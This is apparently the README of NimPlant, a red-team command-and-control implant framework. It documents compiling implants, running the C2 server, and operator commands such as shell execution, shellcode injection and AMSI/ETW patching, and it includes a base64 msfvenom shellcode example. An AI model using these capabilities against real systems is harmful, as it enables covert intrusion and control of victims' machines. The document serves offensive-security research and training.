<div align="center">
  <a href="https://github.com/chvancooten/NimPlant">
    <img src="ui/public/nimplant-logomark.svg" height="150">
  </a>

  <h1>NimPlant - A light first-stage C2 implant written in Nim|Rust and Python</h1>
</div>

[![GitHub Workflow Status](https://img.shields.io/github/actions/workflow/status/chvancooten/NimPlant/main.yml?label=Build)](https://github.com/chvancooten/NimPlant/actions)
[![PRs Welcome](https://img.shields.io/badge/Contributions-Welcome-brightgreen.svg)](http://makeapullrequest.com)

By **Cas van Cooten** ([@chvancooten](https://twitter.com/chvancooten)), with special thanks to some awesome folks: 

_Kadir Yamamoto ([@yamakadi](https://github.com/yamakadi)), Furkan Göksel ([@frkngksl](https://github.com/frkngksl)) , Fabian Mosch ([@S3cur3Th1sSh1t](https://twitter.com/ShitSecure)), Rafael Félix ([@b1scoito](https://github.com/b1scoito)), Guillaume Caillé ([@OffenseTeacher](https://github.com/offenseteacher)), and many others!_

If NimPlant has been useful to you and/or you like my work in general, your support is very welcome:

[![Sponsor on GitHub](https://img.shields.io/badge/%F0%9F%A5%B0-Sponsor%20me%20on%20github-red)](https://github.com/sponsors/chvancooten)

# Feature Overview

- Lightweight and configurable implant written in the Nim and Rust programming languages
- Pretty web GUI that will make you look cool during all your ops
- Encryption and compression of all traffic by default, obfuscates static strings in implant artifacts
- Support for several implant types, including native binaries (exe/dll), shellcode or self-deleting executables
- Wide selection of commands focused on early-stage operations including local enumeration, file or registry management, and web interactions
- Easy deployment of more advanced functionality or payloads via `inline-execute`, `shinject` (using dynamic invocation), `powershell` in a custom runspace, or in-thread `execute-assembly`
- Support for operations on any platform, implant only targeting x64 Windows for now
- Comprehensive logging of all interactions and file operations
- Much, much more, just see below :)

# Instructions

## Installation

A modern version of Python3 is required to run Nimplant.

### Server

- Install `requirements.txt` from the server folder (`pip3 install -r server/requirements.txt`).

### Implant (Nim)

- Install the Nim toolchain for your platform (installation via `choosenim` is recommended, as `apt` doesn't always have the latest version).
- Install required packages using the Nimble package manager (`cd client; nimble install -d`).
- If you're on Linux or MacOS, install the `mingw` toolchain for your platform (`brew install mingw-w64` or `apt install mingw-w64`).
- If you're on ArchLinux specifically, modify your Mingw config as per [this gist](https://gist.github.com/tothi/1f452e0466070db5921135ab312749fc) (thanks [@tothi](https://github.com/tothi)!).

### Implant (Rust)

- Install the Rust toolchain (installation via `rustup` is recommended).
- On linux, install the right windows target: `rustup target add x86_64-pc-windows-gnu`.
- Recommended for increased opsec: Modify your `~/.cargo/config.toml` file as per `Config.toml` and use the nighly build chain (`rustup default nightly`).

## Getting Started

### Configuration

Before using NimPlant, create the configuration file `config.toml`. It is recommended to copy `config.toml.example` and work from there.

An overview of settings is provided below.

| Category | Setting            | Description                                                                                                                                                                          |
|----------|--------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| server   | ip                 | The IP that the C2 web server (including API) will listen on. Recommended to use 127.0.0.1, only use 0.0.0.0 when you have setup proper firewall or routing rules to protect the C2. |
| server   | port               | The port that the C2 web server (including API) will listen on.                                                                                                                      |
| listener | type               | The listener type, either HTTP or HTTPS. HTTPS options configured below.               |
| listener | sslCertPath        | The local path to a HTTPS certificate file (e.g. requested via LetsEncrypt CertBot or self-signed). Ignored when listener type is 'HTTP'.                                                     |
| listener | sslKeyPath         | The local path to the corresponding HTTPS certificate private key file. Password will be prompted when running the NimPlant server if set. Ignored when listener type is 'HTTP'.                                         |
| listener | hostname           | The listener hostname. If not empty (""), NimPlant will use this hostname to connect. Make sure you are properly routing traffic from this host to the NimPlant listener port.       |
| listener | ip                 | The listener IP. Required even if 'hostname' is set, as it is used by the server to register on this IP.                                                                             |
| listener | port               | The listener port. Required even if 'hostname' is set, as it is used by the server to register on this port.                                                                         |
| listener | registerPath       | The URI path that new NimPlants will register with.                                                                                                                                  |
| listener | taskPath           | The URI path that NimPlants will get tasks from.                                                                                                                                     |
| listener | resultPath         | The URI path that NimPlants will submit results to.                                                                                                                                  |
| nimplant | riskyMode          | Compile NimPlant with support for risky commands. Operator discretion advised. Disabling will remove support for `execute-assembly`, `powershell`, `shell` and `shinject`.           |
| nimplant | sleepMask   | Whether or not to use Ekko sleep mask instead of regular sleep calls for Nimplants. Only works with regular executables for now!                                                                                                                                       |
| nimplant | sleepTime   | The default sleep time in seconds for new NimPlants.                                                                                                                                 |
| nimplant | sleepJitter | The default jitter in percent for new NimPlants.                                                                                                                                     |
| nimplant | killDate      | The kill date for Nimplants (format: yyyy-MM-dd). Nimplants will exit if this date has passed.                                                                    |
| nimplant | userAgent          | The user-agent used by NimPlants. The server also uses this to validate NimPlant traffic, so it is recommended to choose a UA that is inconspicuous, but not too prevalent.          |

### Compilation

Once the configuration is to your liking, you can generate NimPlant binaries to deploy on your target. Currently, NimPlant supports `.exe`, `.dll`, and `.bin` binaries for (self-deleting) executables, libraries, and position-independent shellcode (through sRDI), respectively. To generate, run `python NimPlant.py compile` followed by your preferred binaries (`exe`, `exe-selfdelete`, `dll`, `raw`, or `all`) and, optionally, the implant type (`nim`, `rust`, `nim-debug`, or `rust-debug`). Files will be written to `client/bin/` or `client-rs/bin/`, respectively.

You may pass the `rotatekey` argument to generate and use a new XOR key during compilation.

**Notes**:
- NimPlant only supports x64 at this time!
- The entrypoint for DLL files is `Update`, which is triggered by DllMain for all entrypoints. This means you can use e.g. `rundll32 .\NimPlant.dll,Update` to trigger, or use your LOLBIN of choice to sideload it (may need some modifications in `client/NimPlant.nim`)

```
PS C:\NimPlant> python .\NimPlant.py compile all

                  *    *(#    #
                  **  **(##  ##
         ########       (       ********
        ####(###########************,****
           # ########       ******** *
           .###                   ***
           .########         ********
           ####    ###     ***    ****
         ######### ###     *** *********
       #######  ####  ## **  ****  *******
       #####    ##      *      **    *****
       ######  ####   ##***   **** .******
       ###############     ***************
            ##########     **********
               #########**********
                 #######********
     _   _ _           ____  _             _
    | \ | (_)_ __ ___ |  _ \| | __ _ _ __ | |_
    |  \| | | '_ ` _ \| |_) | |/ _` | '_ \| __|
    | |\  | | | | | | |  __/| | (_| | | | | |_
    |_| \_|_|_| |_| |_|_|   |_|\__,_|_| |_|\__|

        A light-weight stage 1 implant and C2 based on Nim|Rust and Python
        By Cas van Cooten (@chvancooten)

Compiling .exe for NimPlant
Compiling self-deleting .exe for NimPlant
Compiling .dll for NimPlant
Compiling .bin for NimPlant

Done compiling! You can find compiled binaries in 'client/bin/'.
```

### Compilation with Docker

Using Docker is easy and avoids dependency issues, as all required build-time and runtime dependencies are pre-installed in the container.

To use Docker, you must first build the `Dockerfile` from source. From the main directory, run the following:

```bash
docker build . -t nimplant
```

This will build a container tagged `nimplant:latest`. Note: this may take a while and produce a sizeable (~2.5G) container due to the development dependencies!

Once this is done, you can run the container from the command line to run the NimPlant server or compile your artefacts.

```bash
docker run --rm -it -v ${PWD}:/nimplant -p80:80 -p443:443 -p31337:31337 nimplant /bin/bash
```

> Note: Make sure to tweak the command based on your preferences (volumen mounting / port forwarding). Also ensure that the container allows non-localhost connections in `config.toml`.

### Usage

Once you have your binaries ready, you can spin up your NimPlant server! No additional configuration is necessary as it reads from the same `config.toml` file. To launch a server, simply run `python NimPlant.py server` (with sudo privileges if running on Linux). You can use the console once a Nimplant checks in, or access the web interface at `http://localhost:31337` (by default).

**Notes**:
- If you are running your NimPlant server externally from the machine where binaries are compiled, make sure that both `config.toml` and `.xorkey` match. If not, NimPlant will not be able to connect.
- The web frontend or API do not support authentication, so **do _NOT_ expose the frontend port to any untrusted networks without a secured reverse proxy!**
- If NimPlant cannot connect to a server or loses connection, it will retry 5 times with an exponential backoff time before attempting re-registration. If it fails to register 5 more times (same backoff logic), it will kill itself. The backoff triples the sleep time on each failed attempt. For example, if the sleep time is 10 seconds, it will wait 10, then 30 (3^1 * 10), then 90 (3^2 * 10), then 270 (3^3 * 10), then 810 seconds before giving up (these parameters are hardcoded but can be changed in `client/NimPlant.nim`).
- Logs are stored in the `server/logs` directory. Each server instance creates a new log folder, and logs are split per console/nimplant session. Downloads and uploads (including files uploaded via the web GUI) are stored in the `server/uploads` and `server/downloads` directories respectively.
- Nimplant and server details are stored in an SQLite database at `server/nimplant.db`. This data is also used to recover Nimplants after a server restart.
- Logs, uploaded/downloaded files, and the database can be cleaned up by running `NimPlant.py` with the `cleanup` flag. Caution: This will purge everything, so make sure to back up what you need first!

```
PS C:\NimPlant> python .\NimPlant.py server     

                  *    *(#    #
                  **  **(##  ##
         ########       (       ********
        ####(###########************,****
           # ########       ******** *
           .###                   ***
           .########         ********
           ####    ###     ***    ****
         ######### ###     *** *********
       #######  ####  ## **  ****  *******
       #####    ##      *      **    *****
       ######  ####   ##***   **** .******
       ###############     ***************
            ##########     **********
               #########**********
                 #######********
     _   _ _           ____  _             _
    | \ | (_)_ __ ___ |  _ \| | __ _ _ __ | |_
    |  \| | | '_ ` _ \| |_) | |/ _` | '_ \| __|
    | |\  | | | | | | |  __/| | (_| | | | | |_
    |_| \_|_|_| |_| |_|_|   |_|\__,_|_| |_|\__|

        A light-weight stage 1 implant and C2 written in Nim|Rust and Python
        By Cas van Cooten (@chvancooten)

[06/02/2023 10:47:23] Started management server on http://127.0.0.1:31337.
[06/02/2023 10:47:23] Started NimPlant listener on https://0.0.0.0:443. CTRL-C to cancel waiting for NimPlants.
```

This will start both the C2 API and management web server (in the example above at `http://127.0.0.1:31337`) and the NimPlant listener (in the example above at `https://0.0.0.0:443`). Once a NimPlant checks in, you can use both the web interface and the console to send commands to NimPlant. 

Available commands are as follows. You can get detailed help for any command by typing `help [command]`. Certain commands denoted with (GUI) can be configured graphically when using the web interface, this can be done by calling the command without any arguments.

```
Command arguments shown as [required] <optional>.
Commands with (GUI) can be run without parameters via the web UI.

cancel            Cancel all pending tasks.
cat               [filename] Print a file's contents to the screen.
cd                [directory] Change the working directory.
clear             Clear the screen.
cp                [source] [destination] Copy a file or directory.
curl              [url] Get a webpage remotely and return the results.
download          [remotefilepath] <localfilepath> Download a file from NimPlant's disk to the NimPlant server.
env               Get environment variables.
execute-assembly  (GUI) <BYPASSAMSI=0> <BLOCKETW=0> [localfilepath] <arguments> Execute .NET assembly from memory. AMSI/ETW patched by default. Loads the CLR.
exit              Exit the server, killing all NimPlants.
getAv             List Antivirus / EDR products on target using WMI.
getDom            Get the domain the target is joined to.
getLocalAdm       List local administrators on the target using WMI.
getpid            Show process ID of the currently selected NimPlant.
getprocname       Show process name of the currently selected NimPlant.
help              <command> Show this help menu or command-specific help.
hostname          Show hostname of the currently selected NimPlant.
inline-execute    (GUI) [localfilepath] [entrypoint] <arg1 type1 arg2 type2..> Execute Beacon Object Files (BOF) from memory.
ipconfig          List IP address information of the currently selected NimPlant.
kill              Kill the currently selected NimPlant.
list              Show list of active NimPlants.
listall           Show list of all NimPlants.
ls                <path> List files and folders in a certain directory. Lists current directory by default.
mkdir             [directory] Create a directory (and its parent directories if required).
mv                [source] [destination] Move a file or directory.
nimplant          Show info about the currently selected NimPlant.
osbuild           Show operating system build information for the currently selected NimPlant.
powershell        <BYPASSAMSI=0> <BLOCKETW=0> [command] Execute a PowerShell command in an unmanaged runspace. Loads the CLR.
ps                List running processes on the target. Indicates current process.
pwd               Get the current working directory.
reg               [query|add] [path] <key> <value> Query or modify the registry. New values will be added as REG_SZ.
rm                [file] Remove a file or directory.
run               [binary] <arguments> Run a binary from disk. Returns output but blocks NimPlant while running.
screenshot        Take a screenshot of the user's screen.
select            [id] Select another NimPlant.
shell             [command] Execute a shell command.
shinject          (GUI) [targetpid] [localfilepath] Load raw shellcode from a file and inject it into the specified process's memory space using dynamic invocation.
sleep             [sleeptime] <jitter%> Change the sleep time of the current NimPlant.
upload            (GUI) [localfilepath] <remotefilepath> Upload a file from the NimPlant server to the victim machine.
wget              [url] <remotefilepath> Download a file to disk remotely.
whoami            Get the user ID that NimPlant is running as.
```

#### Using Beacon Object Files (BOFs)

**NOTE: BOFs are volatile by nature, and running a faulty BOF or passing wrong arguments or types may crash your NimPlant session! Make sure to test BOFs before deploying!**

NimPlant supports the in-memory loading of BOFs thanks to the great [NiCOFF](https://github.com/frkngksl/NiCOFF) (Nim) and [Coffee](https://github.com/hakaioffsec/coffee) (Rust) projects. Running a bof requires a local compiled BOF object file (usually called something like `bofname.x64.o`), an entrypoint (commonly `go`), and a list of arguments with their respective argument types. Arguments are passed as a space-seperated `arg argtype` pair. 

Argument are given in accordance with the "Zzsib" format, so can be either `string` (alias: `z`), `wstring` (or `Z`), `integer` (aliases: `int` or `i`), `short` (`s`), or `binary` (`bin` or `b`). Binary arguments can be a raw binary string or base64-encoded, the latter is recommended to avoid bad characters.

Some examples of usage (using the magnificent TrustedSec BOFs [[1](https://github.com/trustedsec/CS-Situational-Awareness-BOF), [2](https://github.com/trustedsec/CS-Remote-OPs-BOF)] as an example) are given below. Note that `inline-execute` (without arguments) can be used to configure the command graphically in the GUI.

```bash
# Run a bof without arguments
inline-execute ipconfig.x64.o go

# Run the `dir` bof with one wide-string argument specifying the path to list, quoting optional
inline-execute dir.x64.o go "C:\Users\victimuser\desktop" Z

# Run an injection BOF specifying an integer for the process ID and base64-encoded shellcode as bytes
# Example shellcode generated with the command: msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f base64
inline-execute /linux/path/to/createremotethread.x64.o go 1337 i /EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu+AdKgpBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA b

# Depending on the BOF, sometimes argument parsing is a bit different using NiCOFF
# Make sure arguments are passed as expected by the BOF (can usually be retrieved from .CNA or BOF source)
# An example:
inline-execute enum_filter_driver.x64.o go            # CRASHES - default null handling does not work
inline-execute enum_filter_driver.x64.o go "" z       # OK      - arguments are passed as expected
```

#### Push Notifications
By default, NimPlant support push notifications via the `notify_user()` hook defined in `server/util/notify.py`. By default, it implements a simple Telegram notification which requires the `TELEGRAM_CHAT_ID` and `TELEGRAM_BOT_TOKEN` environment variables to be set before it will fire. Of course, the code can be easily extended with one's own push notification functionality. The `notify_user()` hook is called when a new NimPlant checks in, and receives an object with NimPlant details, which can then be pushed as desired.

#### Building the frontend
As a normal user, you shouldn't have to modify or re-build the UI that comes with Nimplant. However, if you so desire to make changes, install NodeJS and run an `npm install` while in the `ui` directory. Then run `ui/build-ui.py`. This will take care of pulling the packages, compiling the Next.JS frontend, and placing the files in the right location for the Nimplant server to use them. 

#### A word on production use and OPSEC
NimPlant was developed as a learning project and released to the public for transparency and educational purposes. For a large part, it makes no effort to hide its intentions. Additionally, protections have been put in place to prevent abuse. In other words, **do NOT use NimPlant in production engagements as-is without thorough source code review and modifications**! Also remember that, as with any C2 framework, the OPSEC fingerprint of running certain commands should be considered before deployment. NimPlant can be compiled without OPSEC-risky commands by setting `riskyMode` to `false` in `config.toml`.

## Troubleshooting
There are many reasons why Nimplant may fail to compile or run. If you encounter issues, please try the following (in order):

- Ensure you followed the steps as described in the 'Installation' section above, double check that all dependencies are installed and the versions match
- Ensure you followed the steps as described in the 'Compilation' section above, and that you have used the Docker to rule out any dependency issues
- Check the logs in the `server/logs` directory for any errors
- Try the `nim-debug` or `rust-debug` compilation modes to compile with console and debug messages (.exe only) to see if any error messages are returned
- Try compiling from another OS or with another toolchain to see if the same error occurs
- If all of the above fails, submit an issue. Make sure to include the appropriate build information (OS, nim/rust/python versions, dependency versions) and the outcome of the troubleshooting steps above. **Incomplete issues may be closed without notice.**
